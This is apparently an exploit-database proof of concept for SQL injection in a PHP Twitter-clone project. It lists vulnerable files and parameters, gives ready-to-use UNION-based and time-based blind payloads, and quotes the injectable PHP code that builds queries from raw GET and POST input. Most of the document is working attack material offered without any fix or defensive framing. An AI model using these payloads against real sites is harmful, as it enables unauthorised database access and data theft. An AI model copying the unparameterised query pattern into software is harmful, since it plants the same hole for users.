# Exploit Author: L0RD
# Vendor Homepage: https://github.com/Fyffe/PHP-Twitter-Clone/
# Version: 1
# CVE: N/A
# Tested on: Win 10
 
# POC : SQLi
# vulnerable files : follow.php , index.php
# vulnerable parameters : userid , username
 
# 1) follow.php :
 
# Parameters : userid , username
# Type : Union query
# Type : Time-based blind
# Payloads :
 
userid: &#039; UNION SELECT 1,2,user(),4,database(),6,7%23
username: &#039; AND sleep(10)%23
 
# vulnerable code :
 
if($_GET[&#039;userid&#039;]  && $_GET[&#039;username&#039;]){
if($_GET[&#039;userid&#039;]!=$user_id){
$follow_userid = $_GET[&#039;userid&#039;];
$follow_username = $_GET[&#039;username&#039;];
include &#039;connect.php&#039;;
$query = mysqli_query($con, "SELECT id
    FROM following
WHERE user1_id=&#039;$user_id&#039; AND user2_id=&#039;$follow_userid&#039;
");
 
# 2) index.php :
 
# vulnerable parameter : username
# Type : Union query
# Payload : 
 
&#039; union select 1,2,user(),4,5,6
 
# vulnerable code :
 
if($_POST[&#039;login-btn&#039;]=="login-submit"){
if($_POST[&#039;username&#039;] != "" && $_POST[&#039;password&#039;] != ""){
$username = strtolower($_POST[&#039;username&#039;]);
include "connect.php";
$query = mysqli_query($con, "SELECT id, password
FROM users
 WHERE username=&#039;$username&#039;");

